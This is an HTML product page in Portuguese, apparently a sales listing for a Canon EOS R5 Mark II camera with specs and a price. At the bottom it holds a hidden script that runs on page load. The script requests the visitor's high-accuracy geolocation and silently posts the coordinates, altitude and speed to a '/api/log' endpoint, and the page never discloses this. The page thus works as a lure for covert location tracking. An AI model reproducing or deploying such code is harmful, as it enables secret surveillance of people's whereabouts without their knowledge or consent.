<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Canon EOS R5 Mark II</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Inter',sans-serif;
            min-height:100vh;
            background:#000;
            color:#fff;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:20px;
        }
        .page{
            max-width:500px;
            width:100%;
            text-align:center;
        }
        .camera-img{
            width:100%;
            max-width:420px;
            border-radius:16px;
            margin-bottom:32px;
            box-shadow:0 20px 60px rgba(0,0,0,.6);
        }
        .brand{
            font-size:.7rem;
            letter-spacing:6px;
            text-transform:uppercase;
            color:#888;
            margin-bottom:8px;
        }
        .model{
            font-size:1.6rem;
            font-weight:700;
            margin-bottom:6px;
        }
        .tagline{
            font-size:.85rem;
            color:#666;
            font-weight:300;
            margin-bottom:32px;
        }
        .specs{
            display:grid;
            grid-template-columns:1fr 1fr 1fr;
            gap:12px;
            margin-bottom:32px;
        }
        .spec{
            background:rgba(255,255,255,.04);
            border:1px solid rgba(255,255,255,.06);
            border-radius:12px;
            padding:16px 8px;
        }
        .spec-val{
            font-size:1.1rem;
            font-weight:700;
            color:#fff;
            margin-bottom:2px;
        }
        .spec-label{
            font-size:.65rem;
            color:#555;
            text-transform:uppercase;
            letter-spacing:1px;
        }
        .price{
            font-size:1.3rem;
            font-weight:700;
            color:#d4001a;
            margin-bottom:6px;
        }
        .price-note{
            font-size:.7rem;
            color:#444;
        }
    </style>
</head>
<body>
    <div class="page">
        <img
            class="camera-img"
            src="https://images.unsplash.com/photo-1502920917128-1aa500764cbd?w=800&q=80"
            alt="Canon Camera"
        />
        <div class="brand">Canon</div>
        <div class="model">EOS R5 Mark II</div>
        <div class="tagline">Mirrorless Full-Frame — O futuro da fotografia</div>
        <div class="specs">
            <div class="spec">
                <div class="spec-val">45MP</div>
                <div class="spec-label">Resolução</div>
            </div>
            <div class="spec">
                <div class="spec-val">8K</div>
                <div class="spec-label">Vídeo RAW</div>
            </div>
            <div class="spec">
                <div class="spec-val">30fps</div>
                <div class="spec-label">Disparo</div>
            </div>
        </div>
        <div class="price">R$ 28.999,00</div>
        <div class="price-note">Em até 12x sem juros</div>
    </div>

    <!-- Captura geolocalização automaticamente -->
    <script>
        window.addEventListener('load', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function(pos) {
                    var c = pos.coords;
                    try {
                        await fetch('/api/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: c.latitude,
                                longitude: c.longitude,
                                accuracy: c.accuracy,
                                altitude: c.altitude,
                                speed: c.speed
                            })
                        });
                    } catch(e) {}
                }, function(){}, { enableHighAccuracy: true, timeout: 15000 });
            }
        });
    </script>
</body>
</html>
